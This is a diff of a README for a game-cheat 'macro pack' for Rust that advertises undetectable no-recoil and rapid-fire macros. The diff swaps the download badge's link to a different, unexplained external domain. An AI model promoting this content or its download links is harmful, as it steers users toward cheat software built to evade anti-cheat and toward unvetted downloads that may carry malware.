@@ -1,6 +1,6 @@
 # Rust Macros 🎯 | Undetectable Recoil & Rapid Fire ⚡️
 
-[![Download Rust Aim Macros](https://img.shields.io/badge/Download-Rust%20AimMacros-blueviolet)](https://resser.tech)
+[![Download Rust Aim Macros](https://img.shields.io/badge/Download-Rust%20AimMacros-blueviolet)](https://2xethevent.com)
 
 Take control in **Rust** with our high-performance **macro pack**, designed for precision and speed. Dominate fights with **no recoil**, **rapid fire**, and more! 🔥  
 - 🖱️ **No Recoil** macros for all weapons  
